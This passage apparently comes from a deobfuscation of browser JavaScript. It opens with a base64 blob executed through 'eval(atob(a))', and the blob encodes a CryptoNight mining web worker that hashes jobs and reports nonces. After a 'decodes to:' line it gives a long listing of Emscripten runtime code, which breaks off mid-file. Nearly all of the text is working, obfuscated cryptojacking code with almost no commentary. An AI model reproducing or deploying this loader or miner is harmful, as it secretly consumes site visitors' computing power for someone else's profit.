W9kdWxlLm9uQWJvcnQod2hhdCl9aWYod2hhdCE9PXVuZGVmaW5lZCl7TW9kdWxlLnByaW50KHdoYXQpO01vZHVsZS5wcmludEVycih3aGF0KTt3aGF0PUpTT04uc3RyaW5naWZ5KHdoYXQpfWVsc2V7d2hhdD0iIn1BQk9SVD0hMDtFWElUU1RBVFVTPTE7dmFyIGV4dHJhPSJcXG5JZiB0aGlzIGFib3J0KCkgaXMgdW5leHBlY3RlZCwgYnVpbGQgd2l0aCAtcyBBU1NFUlRJT05TPTEgd2hpY2ggY2FuIGdpdmUgbW9yZSBpbmZvcm1hdGlvbi4iO3ZhciBvdXRwdXQ9ImFib3J0KCIrd2hhdCsiKSBhdCAiK3N0YWNrVHJhY2UoKStleHRyYTtpZihhYm9ydERlY29yYXRvcnMpe2Fib3J0RGVjb3JhdG9ycy5mb3JFYWNoKChmdW5jdGlvbihkZWNvcmF0b3Ipe291dHB1dD1kZWNvcmF0b3Iob3V0cHV0LHdoYXQpfSkpfXRocm93IG91dHB1dH1Nb2R1bGUuYWJvcnQ9TW9kdWxlLmFib3J0PWFib3J0O2lmKE1vZHVsZS5wcmVJbml0KXtpZih0eXBlb2YgTW9kdWxlLnByZUluaXQ9PSJmdW5jdGlvbiIpTW9kdWxlLnByZUluaXQ9W01vZHVsZS5wcmVJbml0XTt3aGlsZShNb2R1bGUucHJlSW5pdC5sZW5ndGg+MCl7TW9kdWxlLnByZUluaXQucG9wKCkoKX19dmFyIHNob3VsZFJ1bk5vdz0hMDtpZihNb2R1bGUubm9Jbml0aWFsUnVuKXtzaG91bGRSdW5Ob3c9ITF9cnVuKCk7dmFyIENXVz0oZnVuY3Rpb24oKXt0aGlzLmN0eD1fY3J5cHRvbmlnaHRfY3JlYXRlKCk7dGhpcy50aHJvdHRsZVdhaXQ9MDt0aGlzLnRocm90dGxlZFN0YXJ0PTA7dGhpcy50aHJvdHRsZWRIYXNoZXM9MDt0aGlzLndvcmtUaHJvdHRsZWRCb3VuZD10aGlzLndvcmtUaHJvdHRsZWQuYmluZCh0aGlzKTt0aGlzLmN1cnJlbnRKb2I9bnVsbDt0aGlzLnRhcmdldD1uZXcgVWludDhBcnJheShbMjU1LDI1NSwyNTUsMjU1LDI1NSwyNTUsMjU1LDI1NV0pO3ZhciBoZWFwPU1vZHVsZS5IRUFQVTguYnVmZmVyO3RoaXMuaW5wdXQ9bmV3IFVpbnQ4QXJyYXkoaGVhcCxNb2R1bGUuX21hbGxvYyg4NCksODQpO3RoaXMub3V0cHV0PW5ldyBVaW50OEFycmF5KGhlYXAsTW9kdWxlLl9tYWxsb2MoMzIpLDMyKTtzZWxmLnBvc3RNZXNzYWdlKCJyZWFkeSIpO3NlbGYub25tZXNzYWdlPXRoaXMub25NZXNzYWdlLmJpbmQodGhpcyl9KTtDV1cucHJvdG90eXBlLm9uTWVzc2FnZT0oZnVuY3Rpb24obXNnKXt2YXIgam9iPW1zZy5kYXRhO2lmKGpvYi52ZXJpZnlfaWQpe3RoaXMudmVyaWZ5KGpvYik7cmV0dXJufWlmKCF0aGlzLmN1cnJlbnRKb2J8fHRoaXMuY3VycmVudEpvYi5qb2JfaWQhPT1qb2Iuam9iX2lkKXt0aGlzLnNldEpvYihqb2IpfWlmKGpvYi50aHJvdHRsZSl7dGhpcy50aHJvdHRsZVdhaXQ9MS8oMS1qb2IudGhyb3R0bGUpLTE7dGhpcy50aHJvdHRsZWRTdGFydD10aGlzLm5vdygpO3RoaXMudGhyb3R0bGVkSGFzaGVzPTA7dGhpcy53b3JrVGhyb3R0bGVkKCl9ZWxzZXt0aGlzLndvcmsoKX19KTtDV1cucHJvdG90eXBlLmRlc3Ryb3k9KGZ1bmN0aW9uKCl7X2NyeXB0b25pZ2h0X2Rlc3Ryb3kodGhpcy5jdHgpfSk7Q1dXLnByb3RvdHlwZS5oZXhUb0J5dGVzPShmdW5jdGlvbihoZXgsYnl0ZXMpe3ZhciBieXRlcz1uZXcgVWludDhBcnJheShoZXgubGVuZ3RoLzIpO2Zvcih2YXIgaT0wLGM9MDtjPGhleC5sZW5ndGg7Yys9MixpKyspe2J5dGVzW2ldPXBhcnNlSW50KGhleC5zdWJzdHIoYywyKSwxNil9cmV0dXJuIGJ5dGVzfSk7Q1dXLnByb3RvdHlwZS5ieXRlc1RvSGV4PShmdW5jdGlvbihieXRlcyl7Zm9yKHZhciBoZXg9IiIsaT0wO2k8Ynl0ZXMubGVuZ3RoO2krKyl7aGV4Kz0oYnl0ZXNbaV0+Pj40KS50b1N0cmluZygxNik7aGV4Kz0oYnl0ZXNbaV0mMTUpLnRvU3RyaW5nKDE2KX1yZXR1cm4gaGV4fSk7Q1dXLnByb3RvdHlwZS5tZWV0c1RhcmdldD0oZnVuY3Rpb24oaGFzaCx0YXJnZXQpe2Zvcih2YXIgaT0wO2k8dGFyZ2V0Lmxlbmd0aDtpKyspe3ZhciBoaT1oYXNoLmxlbmd0aC1pLTEsdGk9dGFyZ2V0Lmxlbmd0aC1pLTE7aWYoaGFzaFtoaV0+dGFyZ2V0W3RpXSl7cmV0dXJuITF9ZWxzZSBpZihoYXNoW2hpXTx0YXJnZXRbdGldKXtyZXR1cm4hMH19cmV0dXJuITF9KTtDV1cucHJvdG90eXBlLnNldEpvYj0oZnVuY3Rpb24oam9iKXt0aGlzLmN1cnJlbnRKb2I9am9iO3RoaXMuYmxvYj10aGlzLmhleFRvQnl0ZXMoam9iLmJsb2IpO3RoaXMuaW5wdXQuc2V0KHRoaXMuYmxvYik7dmFyIHRhcmdldD10aGlzLmhleFRvQnl0ZXMoam9iLnRhcmdldCk7aWYodGFyZ2V0Lmxlbmd0aDw9OCl7Zm9yKHZhciBpPTA7aTx0YXJnZXQubGVuZ3RoO2krKyl7dGhpcy50YXJnZXRbdGhpcy50YXJnZXQubGVuZ3RoLWktMV09dGFyZ2V0W3RhcmdldC5sZW5ndGgtaS0xXX1mb3IodmFyIGk9MDtpPHRoaXMudGFyZ2V0Lmxlbmd0aC10YXJnZXQubGVuZ3RoO2krKyl7dGhpcy50YXJnZXRbaV09MjU1fX1lbHNle3RoaXMudGFyZ2V0PXRhcmdldH19KTtDV1cucHJvdG90eXBlLm5vdz0oZnVuY3Rpb24oKXtyZXR1cm4gc2VsZi5wZXJmb3JtYW5jZT9zZWxmLnBlcmZvcm1hbmNlLm5vdygpOkRhdGUubm93KCl9KTtDV1cucHJvdG90eXBlLmhhc2g9KGZ1bmN0aW9uKGlucHV0LG91dHB1dCxsZW5ndGgpe3ZhciBub25jZT1NYXRoLnJhbmRvbSgpKjQyOTQ5NjcyOTUrMT4+PjA7dGhpcy5pbnB1dFszOV09KG5vbmNlJjQyNzgxOTAwODApPj4yNDt0aGlzLmlucHV0WzQwXT0obm9uY2UmMTY3MTE2ODApPj4xNjt0aGlzLmlucHV0WzQxXT0obm9uY2UmNjUyODApPj44O3RoaXMuaW5wdXRbNDJdPShub25jZSYyNTUpPj4wO19jcnlwdG9uaWdodF9oYXNoKHRoaXMuY3R4LGlucHV0LmJ5dGVPZmZzZXQsb3V0cHV0LmJ5dGVPZmZzZXQsbGVuZ3RoKX0pO0NXVy5wcm90b3R5cGUudmVyaWZ5PShmdW5jdGlvbihqb2Ipe3RoaXMuYmxvYj10aGlzLmhleFRvQnl0ZXMoam9iLmJsb2IpO3RoaXMuaW5wdXQuc2V0KHRoaXMuYmxvYik7Zm9yKHZhciBpPTAsYz0wO2M8am9iLm5vbmNlLmxlbmd0aDtjKz0yLGkrKyl7dGhpcy5pbnB1dFszOStpXT1wYXJzZUludChqb2Iubm9uY2Uuc3Vic3RyKGMsMiksMTYpfV9jcnlwdG9uaWdodF9oYXNoKHRoaXMuY3R4LHRoaXMuaW5wdXQuYnl0ZU9mZnNldCx0aGlzLm91dHB1dC5ieXRlT2Zmc2V0LHRoaXMuYmxvYi5sZW5ndGgpO3ZhciByZXN1bHQ9dGhpcy5ieXRlc1RvSGV4KHRoaXMub3V0cHV0KTtzZWxmLnBvc3RNZXNzYWdlKHt2ZXJpZnlfaWQ6am9iLnZlcmlmeV9pZCx2ZXJpZmllZDpyZXN1bHQ9PT1qb2IucmVzdWx0fSl9KTtDV1cucHJvdG90eXBlLndvcms9KGZ1bmN0aW9uKCl7dmFyIGhhc2hlcz0wO3ZhciBtZWV0c1RhcmdldD0hMTt2YXIgc3RhcnQ9dGhpcy5ub3coKTt2YXIgZWxhcHNlZD0wO2Rve3RoaXMuaGFzaCh0aGlzLmlucHV0LHRoaXMub3V0cHV0LHRoaXMuYmxvYi5sZW5ndGgpO2hhc2hlcysrO21lZXRzVGFyZ2V0PXRoaXMubWVldHNUYXJnZXQodGhpcy5vdXRwdXQsdGhpcy50YXJnZXQpO2VsYXBzZWQ9dGhpcy5ub3coKS1zdGFydH13aGlsZSghbWVldHNUYXJnZXQmJmVsYXBzZWQ8MWUzKTt2YXIgaGFzaGVzUGVyU2Vjb25kPWhhc2hlcy8oZWxhcHNlZC8xZTMpO2lmKG1lZXRzVGFyZ2V0KXt2YXIgbm9uY2VIZXg9dGhpcy5ieXRlc1RvSGV4KHRoaXMuaW5wdXQuc3ViYXJyYXkoMzksNDMpKTt2YXIgcmVzdWx0SGV4PXRoaXMuYnl0ZXNUb0hleCh0aGlzLm91dHB1dCk7c2VsZi5wb3N0TWVzc2FnZSh7aGFzaGVzUGVyU2Vjb25kOmhhc2hlc1BlclNlY29uZCxoYXNoZXM6aGFzaGVzLGpvYl9pZDp0aGlzLmN1cnJlbnRKb2Iuam9iX2lkLG5vbmNlOm5vbmNlSGV4LHJlc3VsdDpyZXN1bHRIZXh9KX1lbHNle3NlbGYucG9zdE1lc3NhZ2Uoe2hhc2hlc1BlclNlY29uZDpoYXNoZXNQZXJTZWNvbmQsaGFzaGVzOmhhc2hlc30pfX0pO0NXVy5wcm90b3R5cGUud29ya1Rocm90dGxlZD0oZnVuY3Rpb24oKXt2YXIgc3RhcnQ9dGhpcy5ub3coKTt0aGlzLmhhc2godGhpcy5pbnB1dCx0aGlzLm91dHB1dCx0aGlzLmJsb2IubGVuZ3RoKTt2YXIgZW5kPXRoaXMubm93KCk7dmFyIHRpbWVQZXJIYXNoPWVuZC1zdGFydDt0aGlzLnRocm90dGxlZEhhc2hlcysrO3ZhciBlbGFwc2VkPWVuZC10aGlzLnRocm90dGxlZFN0YXJ0O3ZhciBoYXNoZXNQZXJTZWNvbmQ9dGhpcy50aHJvdHRsZWRIYXNoZXMvKGVsYXBzZWQvMWUzKTtpZih0aGlzLm1lZXRzVGFyZ2V0KHRoaXMub3V0cHV0LHRoaXMudGFyZ2V0KSl7dmFyIG5vbmNlSGV4PXRoaXMuYnl0ZXNUb0hleCh0aGlzLmlucHV0LnN1YmFycmF5KDM5LDQzKSk7dmFyIHJlc3VsdEhleD10aGlzLmJ5dGVzVG9IZXgodGhpcy5vdXRwdXQpO3NlbGYucG9zdE1lc3NhZ2Uoe2hhc2hlc1BlclNlY29uZDpoYXNoZXNQZXJTZWNvbmQsaGFzaGVzOnRoaXMudGhyb3R0bGVkSGFzaGVzLGpvYl9pZDp0aGlzLmN1cnJlbnRKb2Iuam9iX2lkLG5vbmNlOm5vbmNlSGV4LHJlc3VsdDpyZXN1bHRIZXh9KTt0aGlzLnRocm90dGxlZEhhc2hlcz0wfWVsc2UgaWYoZWxhcHNlZD4xZTMpe3NlbGYucG9zdE1lc3NhZ2Uoe2hhc2hlc1BlclNlY29uZDpoYXNoZXNQZXJTZWNvbmQsaGFzaGVzOnRoaXMudGhyb3R0bGVkSGFzaGVzfSk7dGhpcy50aHJvdHRsZWRIYXNoZXM9MH1lbHNle3ZhciB3YWl0PU1hdGgubWluKDJlMyx0aW1lUGVySGFzaCp0aGlzLnRocm90dGxlV2FpdCk7c2V0VGltZW91dCh0aGlzLndvcmtUaHJvdHRsZWRCb3VuZCx3YWl0KX19KTtNb2R1bGUub25SdW50aW1lSW5pdGlhbGl6ZWQ9KGZ1bmN0aW9uKCl7dmFyIGNyeXB0b25pZ2h0PW5ldyBDV1d9KQo=';
eval(atob(a));

## decodes to:
var Module = {
    locateFile: (function(path) {
        return path
    })
};
var Module;
if (!Module) Module = (typeof Module !== "undefined" ? Module : null) || {};
var moduleOverrides = {};
for (var key in Module) {
    if (Module.hasOwnProperty(key)) {
        moduleOverrides[key] = Module[key]
    }
}
var ENVIRONMENT_IS_WEB = !1;
var ENVIRONMENT_IS_WORKER = !1;
var ENVIRONMENT_IS_NODE = !1;
var ENVIRONMENT_IS_SHELL = !1;
if (Module.ENVIRONMENT) {
    if (Module.ENVIRONMENT === "WEB") {
        ENVIRONMENT_IS_WEB = !0
    } else if (Module.ENVIRONMENT === "WORKER") {
        ENVIRONMENT_IS_WORKER = !0
    } else if (Module.ENVIRONMENT === "NODE") {
        ENVIRONMENT_IS_NODE = !0
    } else if (Module.ENVIRONMENT === "SHELL") {
        ENVIRONMENT_IS_SHELL = !0
    } else {
        throw new Error("The provided Module[\'ENVIRONMENT\'] value is not valid. It must be one of: WEB|WORKER|NODE|SHELL.")
    }
} else {
    ENVIRONMENT_IS_WEB = typeof window === "object";
    ENVIRONMENT_IS_WORKER = typeof importScripts === "function";
    ENVIRONMENT_IS_NODE = typeof process === "object" && typeof require === "function" && !ENVIRONMENT_IS_WEB && !ENVIRONMENT_IS_WORKER;
    ENVIRONMENT_IS_SHELL = !ENVIRONMENT_IS_WEB && !ENVIRONMENT_IS_NODE && !ENVIRONMENT_IS_WORKER
}
if (ENVIRONMENT_IS_NODE) {
    if (!Module.print) Module.print = console.log;
    if (!Module.printErr) Module.printErr = console.warn;
    var nodeFS;
    var nodePath;
    Module.read = function shell_read(filename, binary) {
        if (!nodeFS) nodeFS = require("fs");
        if (!nodePath) nodePath = require("path");
        filename = nodePath.normalize(filename);
        var ret = nodeFS.readFileSync(filename);
        return binary ? ret : ret.toString()
    };
    Module.readBinary = function readBinary(filename) {
        var ret = Module.read(filename, !0);
        if (!ret.buffer) {
            ret = new Uint8Array(ret)
        }
        assert(ret.buffer);
        return ret
    };
    Module.load = function load(f) {
        globalEval(read(f))
    };
    if (!Module.thisProgram) {
        if (process.argv.length > 1) {
            Module.thisProgram = process.argv[1].replace(/\\\\/g, "/")
        } else {
            Module.thisProgram = "unknown-program"
        }
    }
    Module["arguments"] = process.argv.slice(2);
    if (typeof module !== "undefined") {
        module.exports = Module
    }
    process.on("uncaughtException", (function(ex) {
        if (!(ex instanceof ExitStatus)) {
            throw ex
        }
    }));
    Module.inspect = (function() {
        return "[Emscripten Module object]"
    })
} else if (ENVIRONMENT_IS_SHELL) {
    if (!Module.print) Module.print = print;
    if (typeof printErr != "undefined") Module.printErr = printErr;
    if (typeof read != "undefined") {
        Module.read = read
    } else {
        Module.read = function shell_read() {
            throw "no read() available"
        }
    }
    Module.readBinary = function readBinary(f) {
        if (typeof readbuffer === "function") {
            return new Uint8Array(readbuffer(f))
        }
        var data = read(f, "binary");
        assert(typeof data === "object");
        return data
    };
    if (typeof scriptArgs != "undefined") {
        Module["arguments"] = scriptArgs
    } else if (typeof arguments != "undefined") {
        Module["arguments"] = arguments
    }
    if (typeof quit === "function") {
        Module.quit = (function(status, toThrow) {
            quit(status)
        })
    }
} else if (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER) {
    Module.read = function shell_read(url) {
        var xhr = new XMLHttpRequest;
        xhr.open("GET", url, !1);
        xhr.send(null);
        return xhr.responseText
    };
    if (ENVIRONMENT_IS_WORKER) {
        Module.readBinary = function readBinary(url) {}
    }
    Module.readAsync = function readAsync(url, onload, onerror) {
        console.log("reading async now?");
        return;
        var xhr = new XMLHttpRequest;
        xhr.open("GET", url, !0);
        xhr.responseType = "arraybuffer";
        xhr.onload = function xhr_onload() {
            if (xhr.status == 200 || xhr.status == 0 && xhr.response) {
                onload(xhr.response)
            } else {
                onerror()
            }
        };
        xhr.onerror = onerror;
        xhr.send(null)
    };
    if (typeof arguments != "undefined") {
        Module["arguments"] = arguments
    }
    if (typeof console !== "undefined") {
        if (!Module.print) Module.print = function shell_print(x) {
            console.log(x)
        };
        if (!Module.printErr) Module.printErr = function shell_printErr(x) {
            console.warn(x)
        }
    } else {
        var TRY_USE_DUMP = !1;
        if (!Module.print) Module.print = TRY_USE_DUMP && typeof dump !== "undefined" ? (function(x) {
            dump(x)
        }) : (function(x) {})
    }
    if (ENVIRONMENT_IS_WORKER) {
        Module.load = importScripts
    }
    if (typeof Module.setWindowTitle === "undefined") {
        Module.setWindowTitle = (function(title) {
            document.title = title
        })
    }
} else {
    throw "Unknown runtime environment. Where are we?"
}

function globalEval(x) {
    eval.call(null, x)
}
if (!Module.load && Module.read) {
    Module.load = function load(f) {
        globalEval(Module.read(f))
    }
}
if (!Module.print) {
    Module.print = (function() {})
}
if (!Module.printErr) {
    Module.printErr = Module.print
}
if (!Module["arguments"]) {
    Module["arguments"] = []
}
if (!Module.thisProgram) {
    Module.thisProgram = "./this.program"
}
if (!Module.quit) {
    Module.quit = (function(status, toThrow) {
        throw toThrow
    })
}
Module.print = Module.print;
Module.printErr = Module.printErr;
Module.preRun = [];
Module.postRun = [];
for (var key in moduleOverrides) {
    if (moduleOverrides.hasOwnProperty(key)) {
        Module[key] = moduleOverrides[key]
    }
}
moduleOverrides = undefined;
var Runtime = {
    setTempRet0: (function(value) {
        tempRet0 = value;
        return value
    }),
    getTempRet0: (function() {
        return tempRet0
    }),
    stackSave: (function() {
        return STACKTOP
    }),
    stackRestore: (function(stackTop) {
        STACKTOP = stackTop
    }),
    getNativeTypeSize: (function(type) {
        switch (type) {
            case "i1":
            case "i8":
                return 1;
            case "i16":
                return 2;
            case "i32":
                return 4;
            case "i64":
                return 8;
            case "float":
                return 4;
            case "double":
                return 8;
            default:
                {
                    if (type[type.length - 1] === "*") {
                        return Runtime.QUANTUM_SIZE
                    } else if (type[0] === "i") {
                        var bits = parseInt(type.substr(1));
                        assert(bits % 8 === 0);
                        return bits / 8
                    } else {
                        return 0
                    }
                }
        }
    }),
    getNativeFieldSize: (function(type) {
        return Math.max(Runtime.getNativeTypeSize(type), Runtime.QUANTUM_SIZE)
    }),
    STACK_ALIGN: 16,
    prepVararg: (function(ptr, type) {
        if (type === "double" || type === "i64") {
            if (ptr & 7) {
                assert((ptr & 7) === 4);
                ptr += 4
            }
        } else {
            assert((ptr & 3) === 0)
        }
        return ptr
    }),
    getAlignSize: (function(type, size, vararg) {
        if (!vararg && (type == "i64" || type == "double")) return 8;
        if (!type) return Math.min(size, 8);
        return Math.min(size || (type ? Runtime.getNativeFieldSize(type) : 0), Runtime.QUANTUM_SIZE)
    }),
    dynCall: (function(sig, ptr, args) {
        if (args && args.length) {
            return Module["dynCall_" + sig].apply(null, [ptr].concat(args))
        } else {
            return Module["dynCall_" + sig].call(null, ptr)
        }
    }),
    functionPointers: [],
    addFunction: (function(func) {
        for (var i = 0; i < Runtime.functionPointers.length; i++) {
            if (!Runtime.functionPointers[i]) {
                Runtime.functionPointers[i] = func;
                return 2 * (1 + i)
            }
        }
        throw "Finished up all reserved function pointers. Use a higher value for RESERVED_FUNCTION_POINTERS."
    }),
    removeFunction: (function(index) {
        Runtime.functionPointers[(index - 2) / 2] = null
    }),
    warnOnce: (function(text) {
        if (!Runtime.warnOnce.shown) Runtime.warnOnce.shown = {};
        if (!Runtime.warnOnce.shown[text]) {
            Runtime.warnOnce.shown[text] = 1;
            Module.printErr(text)
        }
    }),
    funcWrappers: {},
    getFuncWrapper: (function(func, sig) {
        assert(sig);
        if (!Runtime.funcWrappers[sig]) {
            Runtime.funcWrappers[sig] = {}
        }
        var sigCache = Runtime.funcWrappers[sig];
        if (!sigCache[func]) {
            if (sig.length === 1) {
                sigCache[func] = function dynCall_wrapper() {
                    return Runtime.dynCall(sig, func)
                }
            } else if (sig.length === 2) {
                sigCache[func] = function dynCall_wrapper(arg) {
                    return Runtime.dynCall(sig, func, [arg])
                }
            } else {
                sigCache[func] = function dynCall_wrapper() {
                    return Runtime.dynCall(sig, func, Array.prototype.slice.call(arguments))
                }
            }
        }
        return sigCache[func]
    }),
    getCompilerSetting: (function(name) {
        throw "You must build with -s RETAIN_COMPILER_SETTINGS=1 for Runtime.getCompilerSetting or emscripten_get_compiler_setting to work"
    }),
    stackAlloc: (function(size) {
        var ret = STACKTOP;
        STACKTOP = STACKTOP + size | 0;
        STACKTOP = STACKTOP + 15 & -16;
        return ret
    }),
    staticAlloc: (function(size) {
        var ret = STATICTOP;
        STATICTOP = STATICTOP + size | 0;
        STATICTOP = STATICTOP + 15 & -16;
        return ret
    }),
    dynamicAlloc: (function(size) {
        var ret = HEAP32[DYNAMICTOP_PTR >> 2];
        var end = (ret + size + 15 | 0) & -16;
        HEAP32[DYNAMICTOP_PTR >> 2] = end;
        if (end >= TOTAL_MEMORY) {
            var success = enlargeMemory();
            if (!success) {
                HEAP32[DYNAMICTOP_PTR >> 2] = ret;
                return 0
            }
        }
        return ret
    }),
    alignMemory: (function(size, quantum) {
        var ret = size = Math.ceil(size / (quantum ? quantum : 16)) * (quantum ? quantum : 16);
        return ret
    }),
    makeBigInt: (function(low, high, unsigned) {
        var ret = unsigned ? +(low >>> 0) + +(high >>> 0) * 4294967296 : +(low >>> 0) + +(high | 0) * 4294967296;
        return ret
    }),
    GLOBAL_BASE: 1024,
    QUANTUM_SIZE: 4,
    __dummy__: 0
};
Module.Runtime = Runtime;
var ABORT = 0;
var EXITSTATUS = 0;

function assert(condition, text) {
    if (!condition) {
        abort("Assertion failed: " + text)
    }
}

function getCFunc(ident) {
    var func = Module["_" + ident];
    if (!func) {
        try {
            func = eval("_" + ident)
        } catch (e) {}
    }
    assert(func, "Cannot call unknown function " + ident + " (perhaps LLVM optimizations or closure removed it?)");
    return func
}
var cwrap, ccall;
((function() {
    var JSfuncs = {
        "stackSave": (function() {
            Runtime.stackSave()
        }),
        "stackRestore": (function() {
            Runtime.stackRestore()
        }),
        "arrayToC": (function(arr) {
            var ret = Runtime.stackAlloc(arr.length);
            writeArrayToMemory(arr, ret);
            return ret
        }),
        "stringToC": (function(str) {
            var ret = 0;
            if (str !== null && str !== undefined && str !== 0) {
                var len = (str.length << 2) + 1;
                ret = Runtime.stackAlloc(len);
                stringToUTF8(str, ret, len)
            }
            return ret
        })
    };
    var toC = {
        "string": JSfuncs.stringToC,
        "array": JSfuncs.arrayToC
    };
    ccall = function ccallFunc(ident, returnType, argTypes, args, opts) {
        var func = getCFunc(ident);
        var cArgs = [];
        var stack = 0;
        if (args) {
            for (var i = 0; i < args.length; i++) {
                var converter = toC[argTypes[i]];
                if (converter) {
                    if (stack === 0) stack = Runtime.stackSave();
                    cArgs[i] = converter(args[i])
                } else {
                    cArgs[i] = args[i]
                }
            }
        }
        var ret = func.apply(null, cArgs);
        if (returnType === "string") ret = Pointer_stringify(ret);
        if (stack !== 0) {
            if (opts && opts.async) {
                EmterpreterAsync.asyncFinalizers.push((function() {
                    Runtime.stackRestore(stack)
                }));
                return
            }
            Runtime.stackRestore(stack)
        }
        return ret
    };
    var sourceRegex = /^function\\s*[a-zA-Z$_0-9]*\\s*\\(([^)]*)\\)\\s*{\\s*([^*]*?)[\\s;]*(?:return\\s*(.*?)[;\\s]*)?}$/;

    function parseJSFunc(jsfunc) {
        var parsed = jsfunc.toString().match(sourceRegex).slice(1);
        return {
            arguments: parsed[0],
            body: parsed[1],
            returnValue: parsed[2]
        }
    }
    var JSsource = null;

    function ensureJSsource() {
        if (!JSsource) {
            JSsource = {};
            for (var fun in JSfuncs) {
                if (JSfuncs.hasOwnProperty(fun)) {
                    JSsource[fun] = parseJSFunc(JSfuncs[fun])
                }
            }
        }
    }
    cwrap = function cwrap(ident, returnType, argTypes) {
        argTypes = argTypes || [];
        var cfunc = getCFunc(ident);
        var numericArgs = argTypes.every((function(type) {
            return type === "number"
        }));
        var numericRet = returnType !== "string";
        if (numericRet && numericArgs) {
            return cfunc
        }
        var argNames = argTypes.map((function(x, i) {
            return "$" + i
        }));
        var funcstr = "(function(" + argNames.join(",") + ") {";
        var nargs = argTypes.length;
        if (!numericArgs) {
            ensureJSsource();
            funcstr += "var stack = " + JSsource.stackSave.body + ";";
            for (var i = 0; i < nargs; i++) {
                var arg = argNames[i],
                    type = argTypes[i];
                if (type === "number") continue;
                var convertCode = JSsource[type + "ToC"];
                funcstr += "var " + convertCode.arguments + " = " + arg + ";";
                funcstr += convertCode.body + ";";
                funcstr += arg + "=(" + convertCode.returnValue + ");"
            }
        }
        var cfuncname = parseJSFunc((function() {
            return cfunc
        })).returnValue;
        funcstr += "var ret = " + cfuncname + "(" + argNames.join(",") + ");";
        if (!numericRet) {
            var strgfy = parseJSFunc((function() {
                return Pointer_stringify
            })).returnValue;
            funcstr += "ret = " + strgfy + "(ret);"
        }
        if (!numericArgs) {
            ensureJSsource();
            funcstr += JSsource.stackRestore.body.replace("()", "(stack)") + ";"
        }
        funcstr += "return ret})";
        return eval(funcstr)
    }
}))();
Module.ccall = ccall;
Module.cwrap = cwrap;

function setValue(ptr, value, type, noSafe) {
    type = type || "i8";
    if (type.charAt(type.length - 1) === "*") type = "i32";
    switch (type) {
        case "i1":
            HEAP8[ptr >> 0] = value;
            break;
        case "i8":
            HEAP8[ptr >> 0] = value;
            break;
        case "i16":
            HEAP16[ptr >> 1] = value;
            break;
        case "i32":
            HEAP32[ptr >> 2] = value;
            break;
        case "i64":
            tempI64 = [value >>> 0, (tempDouble = value, +Math_abs(tempDouble) >= 1 ? tempDouble > 0 ? (Math_min(+Math_floor(tempDouble / 4294967296), 4294967295) | 0) >>> 0 : ~~+Math_ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0 : 0)], HEAP32[ptr >> 2] = tempI64[0], HEAP32[ptr + 4 >> 2] = tempI64[1];
            break;
        case "float":
            HEAPF32[ptr >> 2] = value;
            break;
        case "double":
            HEAPF64[ptr >> 3] = value;
            break;
        default:
            abort("invalid type for setValue: " + type)
    }
}
Module.setValue = setValue;

function getValue(ptr, type, noSafe) {
    type = type || "i8";
    if (type.charAt(type.length - 1) === "*") type = "i32";
    switch (type) {
        case "i1":
            return HEAP8[ptr >> 0];
        case "i8":
            return HEAP8[ptr >> 0];
        case "i16":
            return HEAP16[ptr >> 1];
        case "i32":
            return HEAP32[ptr >> 2];
        case "i64":
            return HEAP32[ptr >> 2];
        case "float":
            return HEAPF32[ptr >> 2];
        case "double":
            return HEAPF64[ptr >> 3];
        default:
            abort("invalid type for setValue: " + type)
    }
    return null
}
Module.getValue = getValue;
var ALLOC_NORMAL = 0;
var ALLOC_STACK = 1;
var ALLOC_STATIC = 2;
var ALLOC_DYNAMIC = 3;
var ALLOC_NONE = 4;
Module.ALLOC_NORMAL = ALLOC_NORMAL;
Module.ALLOC_STACK = ALLOC_STACK;
Module.ALLOC_STATIC = ALLOC_STATIC;
Module.ALLOC_DYNAMIC = ALLOC_DYNAMIC;
Module.ALLOC_NONE = ALLOC_NONE;

function allocate(slab, types, allocator, ptr) {
    var zeroinit, size;
    if (typeof slab === "number") {
        zeroinit = !0;
        size = slab
    } else {
        zeroinit = !1;
        size = slab.length
    }
    var singleType = typeof types === "string" ? types : null;
    var ret;
    if (allocator == ALLOC_NONE) {
        ret = ptr
    } else {
        ret = [typeof _malloc === "function" ? _malloc : Runtime.staticAlloc, Runtime.stackAlloc, Runtime.staticAlloc, Runtime.dynamicAlloc][allocator === undefined ? ALLOC_STATIC : allocator](Math.max(size, singleType ? 1 : types.length))
    }
    if (zeroinit) {
        var ptr = ret,
            stop;
        assert((ret & 3) == 0);
        stop = ret + (size & ~3);
        for (; ptr < stop; ptr += 4) {
            HEAP32[ptr >> 2] = 0
        }
        stop = ret + size;
        while (ptr < stop) {
            HEAP8[ptr++ >> 0] = 0
        }
        return ret
    }
    if (singleType === "i8") {
        if (slab.subarray || slab.slice) {
            HEAPU8.set(slab, ret)
        } else {
            HEAPU8.set(new Uint8Array(slab), ret)
        }
        return ret
    }
    var i = 0,
        type, typeSize, previousType;
    while (i < size) {
        var curr = slab[i];
        if (typeof curr === "function") {
            curr = Runtime.getFunctionIndex(curr)
        }
        type = singleType || types[i];
        if (type === 0) {
            i++;
            continue
        }
        if (type == "i64") type = "i32";
        setValue(ret + i, curr, type);
        if (previousType !== type) {
            typeSize = Runtime.getNativeTypeSize(type);
            previousType = type
        }
        i += typeSize
    }
    return ret
}
Module.allocate = allocate;

function getMemory(size) {
    if (!staticSealed) return Runtime.staticAlloc(size);
    if (!runtimeInitialized) return Runtime.dynamicAlloc(size);
    return _malloc(size)
}
Module.getMemory = getMemory;

function Pointer_stringify(ptr, length) {
    if (length === 0 || !ptr) return "";
    var hasUtf = 0;
    var t;
    var i = 0;
    while (1) {
        t = HEAPU8[ptr + i >> 0];
        hasUtf |= t;
        if (t == 0 && !length) break;
        i++;
        if (length && i == length) break
    }
    if (!length) length = i;
    var ret = "";
    if (hasUtf < 128) {
        var MAX_CHUNK = 1024;
        var curr;
        while (length > 0) {
            curr = String.fromCharCode.apply(String, HEAPU8.subarray(ptr, ptr + Math.min(length, MAX_CHUNK)));
            ret = ret ? ret + curr : curr;
            ptr += MAX_CHUNK;
            length -= MAX_CHUNK
        }
        return ret
    }
    return Module.UTF8ToString(ptr)
}
Module.Pointer_stringify = Pointer_stringify;

function AsciiToString(ptr) {
    var str = "";
    while (1) {
        var ch = HEAP8[ptr++ >> 0];
        if (!ch) return str;
        str += String.fromCharCode(ch)
    }
}
Module.AsciiToString = AsciiToString;

function stringToAscii(str, outPtr) {
    return writeAsciiToMemory(str, outPtr, !1)
}
Module.stringToAscii = stringToAscii;
var UTF8Decoder = typeof TextDecoder !== "undefined" ? new TextDecoder("utf8") : undefined;

